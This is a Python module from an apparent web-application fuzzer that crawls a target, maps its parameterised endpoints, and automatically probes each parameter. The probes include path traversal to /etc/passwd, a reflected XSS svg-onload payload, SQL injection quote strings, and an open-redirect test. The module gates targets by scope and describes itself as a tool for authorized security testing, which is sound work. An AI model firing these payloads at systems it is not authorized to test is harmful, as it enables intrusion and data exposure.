"""Autopilot — one-command "find the attack surface, then test it".

The manual flow is: crawl → eyeball the endpoints → pick the interesting
params → hand-craft payloads → fuzz each one. That is exactly the slow part
this module removes. `phantomfuzz auto -u <target>`:

  1. DISCOVER  — crawl the site + mine the SPA JS bundles (+ headless render if
                 Playwright is present) to surface pages, parameterised URLs,
                 API endpoints and backends.
  2. SHOW      — print that map to the user first.
  3. TEST      — if the user gave no wordlist, automatically probe every
                 parameterised endpoint with a curated default battery
                 (path-traversal, XSS reflection, SQLi error, and value
                 tampering), filtering false positives. If the user *did* pass
                 -w, that wordlist is used to fuzz the discovered endpoints
                 instead.

Everything is for authorized testing of systems you own or may test.
"""

import asyncio
import re
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from .banner import C
from .detect import _norm
from .http_client import Response

try:
    import aiohttp
    HAVE_AIOHTTP = True
except ImportError:
    HAVE_AIOHTTP = False


# --------------------------------------------------------------------------- #
#  default probe battery
# --------------------------------------------------------------------------- #
# param-name hints -> which probe class is most relevant
FILE_HINTS = ("file", "filename", "path", "page", "doc", "document", "template",
              "include", "inc", "dir", "folder", "download", "read", "load",
              "view", "content", "img", "image", "url", "src")
REDIRECT_HINTS = ("url", "redirect", "next", "return", "returnurl", "goto",
                  "dest", "destination", "continue", "target", "link")

# unique marker so we can spot reflection unambiguously
MARK = "phx9k7z"
TRAVERSAL = "../../../../../../etc/passwd"
XSS_PROBE = f'{MARK}"><svg/onload=alert(1)>'
SQLI_PROBES = ["'", "''", "' OR '1'='1", "1'\"`"]
SQL_ERRORS = re.compile(
    r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite/JDBC|"
    r"Unclosed quotation|quoted string not properly terminated|"
    r"pg_query\(\)|valid MySQL result|SQLSTATE\[)", re.I)
PASSWD_RE = re.compile(r"root:.*?:0:0:")
OPEN_REDIRECT_TEST = "https://evil.example.com/"


def _sim(a, b):
    import difflib
    return difflib.SequenceMatcher(None, _norm(a), _norm(b)).quick_ratio()


async def _mk_session(cookies, headers, verify_ssl, timeout):
    jar = aiohttp.CookieJar(unsafe=True)
    conn = aiohttp.TCPConnector(ssl=verify_ssl, limit=40)
    s = aiohttp.ClientSession(
        cookie_jar=jar, connector=conn,
        timeout=aiohttp.ClientTimeout(total=timeout), headers=headers or {})
    if cookies:
        try:
            jar.update_cookies(cookies)
        except Exception:
            pass
    return s


async def _get(session, url):
    start = time.monotonic()
    try:
        async with session.get(url, allow_redirects=False) as r:
            body = await r.read()
            return Response({}, url, r.status, body,
                            (time.monotonic() - start) * 1000,
                            r.headers.get("Location"))
    except Exception as e:  # noqa: BLE001
        return Response({}, url, 0, b"", 0.0, error=str(e))


def _set_param(url, key, value):
    parts = urlsplit(url)
    q = parse_qsl(parts.query, keep_blank_values=True)
    q = [(k, value if k == key else v) for k, v in q]
    return urlunsplit(parts._replace(query=urlencode(q)))


# --------------------------------------------------------------------------- #
#  1. discovery
# --------------------------------------------------------------------------- #

async def discover(target, cookies=None, headers=None, verify_ssl=False,
                   depth=2, max_pages=120, use_render=False, on_log=None,
                   timeout=20):
    """Crawl + JS-mine (+ optional render) and return the attack-surface map."""
    from .crawl import Crawler, merge_js_intel, merge_rendered

    crawler = Crawler(target, max_depth=depth, max_pages=max_pages,
                      verify_ssl=verify_ssl, cookies=cookies, headers=headers,
                      timeout=timeout)
    result = await crawler.run()

    try:
        result, _ = await merge_js_intel(result, target, cookies=cookies,
                                         headers=headers, verify_ssl=verify_ssl)
    except Exception as e:  # noqa: BLE001
        if on_log:
            on_log(f"JS intel skipped: {e}")

    if use_render:
        try:
            result, ok = await merge_rendered(result, target)
            if ok and on_log:
                on_log("merged headless-browser SPA routes/APIs")
        except Exception as e:  # noqa: BLE001
            if on_log:
                on_log(f"render skipped: {e}")

    return result


def registrable_domain(host):
    """Best-effort eTLD+1 (last two labels) — covers the common .com/.net case.

    Not a full public-suffix parse (misses .co.uk-style TLDs), so callers may
    pass an explicit scope for those. Good enough to keep a scan from wandering
    off onto a wholly different company's domain.
    """
    host = (host or "").lower().strip().strip(".")
    host = host.split("@")[-1].split(":")[0]
    parts = host.split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else host


def in_scope(url, scope):
    """True if url's host equals `scope` or is a subdomain of it."""
    if not scope:
        return True
    host = urlsplit(url).netloc.split("@")[-1].split(":")[0].lower()
    return host == scope or host.endswith("." + scope)


def parameterised_targets(result, scope=None):
    """Build concrete param'd URLs to test from the crawl result.

    Returns list of (url, [param names]). Includes crawler-found param URLs and
    any API endpoints that already carry a query string. When `scope` is given
    (a registrable domain), targets whose host is not that domain / a subdomain
    of it are dropped — so a discovered off-site link (a third-party login/SSO
    host, a CDN, an analytics domain) is never sent attack payloads. This is a
    hard safety gate for authorized testing: you must not probe out-of-scope
    hosts.
    """
    targets = []
    for base, names in sorted(result.get("params", {}).items()):
        names = list(names)
        q = "&".join(f"{n}=1" for n in names)
        url = f"{base}?{q}"
        if in_scope(url, scope):
            targets.append((url, names))
    # API endpoints from JS that already look parameterised
    intel = result.get("js_intel", {})
    for a in intel.get("apis", []):
        if "?" in a and "=" in a:
            base = a.split("?")[0]
            names = [kv.split("=")[0] for kv in urlsplit(a).query.split("&") if kv]
            if names and in_scope(a, scope):
                targets.append((a, names))
    return targets


# --------------------------------------------------------------------------- #
#  2. default test battery
# --------------------------------------------------------------------------- #

async def _probe_param(session, url, key, baseline):
    """Run the default battery against one parameter. Returns list of findings."""
    finds = []
    klow = key.lower()

    # -- path traversal (esp. file-ish params, but try everywhere) --
    tr_url = _set_param(url, key, TRAVERSAL)
    r = await _get(session, tr_url)
    if not r.error and PASSWD_RE.search(r.body_text):
        finds.append(("PATH TRAVERSAL", key, TRAVERSAL, r,
                      "read /etc/passwd (root:...:0:0:)"))

    # -- reflected XSS --
    xss_url = _set_param(url, key, XSS_PROBE)
    r = await _get(session, xss_url)
    if not r.error and ('"><svg/onload=alert(1)>' in r.body_text
                        or f'{MARK}"><svg' in r.body_text):
        finds.append(("REFLECTED XSS", key, XSS_PROBE, r,
                      "payload reflected un-encoded in response"))
    elif not r.error and MARK in r.body_text:
        # reflected but encoded — worth noting as an input echo
        pass

    # -- SQL injection (error-based) --
    for pl in SQLI_PROBES:
        r = await _get(session, _set_param(url, key, pl))
        if not r.error and SQL_ERRORS.search(r.body_text):
            finds.append(("SQL INJECTION", key, pl, r,
                          "database error surfaced by a quote"))
            break
        if not r.error and baseline and not baseline.error \
                and r.status != baseline.status and r.status >= 500:
            finds.append(("SQLi (possible)", key, pl, r,
                          f"quote flipped status {baseline.status}->{r.status}"))
            break

    # -- open redirect (redirect-ish params) --
    if any(h in klow for h in REDIRECT_HINTS):
        r = await _get(session, _set_param(url, key, OPEN_REDIRECT_TEST))
        loc = (r.redirect or "")
        if r.status in (301, 302, 303, 307, 308) and "evil.example.com" in loc:
            finds.append(("OPEN REDIRECT", key, OPEN_REDIRECT_TEST, r,
                          f"Location -> {loc}"))

    return finds


async def test_targets(targets, cookies=None, headers=None, verify_ssl=False,
                       timeout=15, concurrency=12, on_log=None, on_progress=None):
    """Probe every (url, params) target with the default battery."""
    findings = []
    if not targets:
        return findings
    total = sum(len(p) for _, p in targets)
    done = [0]
    sem = asyncio.Semaphore(concurrency)

    async with await _mk_session(cookies, headers, verify_ssl, timeout) as s:
        async def one(url, key):
            async with sem:
                baseline = await _get(s, _set_param(url, key, "1"))
                res = await _probe_param(s, url, key, baseline)
            done[0] += 1
            if on_progress:
                on_progress(done[0], total)
            for f in res:
                findings.append((url,) + f)

        jobs = [one(url, k) for url, names in targets for k in names]
        await asyncio.gather(*jobs)
    return findings


# --------------------------------------------------------------------------- #
#  3. interactive attack console (mode-select + live heartbeat)
# --------------------------------------------------------------------------- #

async def attack_targets(targets, choice="context", cookies=None, headers=None,
                         verify_ssl=False, timeout=15, concurrency=10,
                         on_status=None, status_interval=3.0):
    """Fire the chosen attack category(ies) at every param, with a heartbeat.

    `choice` is one of attacklib.CATEGORIES, or "context" (pick per param) or
    "all" (run every category). For each (url, param, category) it walks that
    category's payloads and stops at the first confirmed hit. Every
    `status_interval` seconds it calls on_status(status_dict) so the CLI can
    show what it's doing. Returns findings: (url, key, cat, payload, resp, why).
    """
    from . import attacklib
    findings = []
    jobs = []
    for url, names in targets:
        for key in names:
            for cat in attacklib.select_categories(choice, key):
                jobs.append((url, key, cat))
    if not jobs:
        return findings

    status = {"done": 0, "total": len(jobs), "findings": 0,
              "cur": "starting…", "bycat": {}}
    sem = asyncio.Semaphore(concurrency)
    baselines = {}
    baseline_locks = {}
    stop = asyncio.Event()

    async with await _mk_session(cookies, headers, verify_ssl, timeout) as s:
        async def baseline_for(url, key):
            bk = (url, key)
            if bk not in baselines:
                lk = baseline_locks.setdefault(bk, asyncio.Lock())
                async with lk:
                    if bk not in baselines:
                        baselines[bk] = await _get(s, _set_param(url, key, "1"))
            return baselines[bk]

        async def do(url, key, cat):
            async with sem:
                base = await baseline_for(url, key)
                host = urlsplit(url).netloc
                status["cur"] = (f"{attacklib.EMOJI.get(cat, '')} {cat} "
                                 f"-> {host} ?{key}")
                for pl in attacklib.load(cat):
                    r = await _get(s, _set_param(url, key, pl))
                    hit, why = attacklib.detect(cat, pl, r, base)
                    if hit:
                        findings.append((url, key, cat, pl, r, why))
                        status["findings"] += 1
                        status["bycat"][cat] = status["bycat"].get(cat, 0) + 1
                        break
            status["done"] += 1

        async def heartbeat():
            while not stop.is_set():
                try:
                    await asyncio.wait_for(stop.wait(), timeout=status_interval)
                except asyncio.TimeoutError:
                    if on_status:
                        on_status(dict(status))

        hb = asyncio.create_task(heartbeat())
        try:
            await asyncio.gather(*(do(u, k, c) for u, k, c in jobs))
        finally:
            stop.set()
            await hb
        if on_status:
            on_status(dict(status))          # final tick
    return findings
